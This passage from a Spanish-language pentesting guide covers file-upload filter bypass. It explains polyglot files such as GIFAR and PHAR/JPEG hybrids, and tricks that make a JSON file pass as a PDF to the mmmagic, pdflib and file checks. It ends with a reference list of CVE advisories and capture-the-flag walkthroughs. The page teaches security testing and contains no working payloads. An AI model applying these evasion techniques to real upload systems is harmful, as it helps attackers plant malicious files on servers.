Los archivos polyglot sirven como una herramienta única en ciberseguridad, actuando como camaleones que pueden existir válidamente en múltiples formatos de archivo simultáneamente. Un ejemplo intrigante es un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un híbrido que funciona tanto como GIF como RAR. Tales archivos no se limitan a este emparejamiento; combinaciones como GIF y JS o PPT y JS también son factibles.

La utilidad principal de los archivos polyglot reside en su capacidad para eludir medidas de seguridad que filtran archivos según su tipo. La práctica común en varias aplicaciones consiste en permitir solo ciertos tipos de archivo para upload—como JPEG, GIF o DOC—para mitigar el riesgo que representan formatos potencialmente dañinos (p. ej., JS, PHP o Phar). Sin embargo, un polyglot, al ajustarse a los criterios estructurales de múltiples tipos de archivo, puede sortear sigilosamente estas restricciones.

A pesar de su adaptabilidad, los polyglots encuentran limitaciones. Por ejemplo, mientras un polyglot podría simultáneamente encarnar un PHAR file (PHp ARchive) y un JPEG, el éxito de su upload podría depender de las políticas de extensión de archivo de la plataforma. Si el sistema es estricto respecto a las extensiones permitidas, la mera dualidad estructural de un polyglot puede no ser suficiente para garantizar su upload.

Más información en: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Cómo evitar la detección del tipo de archivo subiendo un archivo JSON válido aunque no esté permitido, haciéndolo pasar por un archivo PDF (técnicas from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Mientras los bytes mágicos `%PDF` estén en los primeros 1024 bytes es válido (ver ejemplo en el post)
- **`pdflib` library**: Agrega un formato PDF falso dentro de un field del JSON para que la library piense que es un pdf (ver ejemplo en el post)
- **`file` binary**: Puede leer hasta 1048576 bytes de un archivo. Simplemente crea un JSON más grande que eso para que no pueda parsear el contenido como json y luego, dentro del JSON, coloca la parte inicial de un PDF real y pensará que es un PDF

## Referencias

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
